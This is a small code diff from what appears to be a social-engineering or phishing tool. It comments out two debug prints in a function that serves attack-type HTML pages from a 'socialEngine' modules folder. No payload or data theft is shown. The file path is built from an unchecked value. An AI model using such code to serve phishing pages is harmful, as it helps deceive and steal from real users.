@@ -70,8 +70,8 @@ def attack_url(attack_url):
         u: user_sessen = url_list.get(attack_url)
         r = Response()
         try:
-            print('modules/socialEngine/'+u.attack_type+"/index.html")
-            print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
+            # print('modules/socialEngine/'+u.attack_type+"/index.html")
+            # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
             r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
             return r
         except:
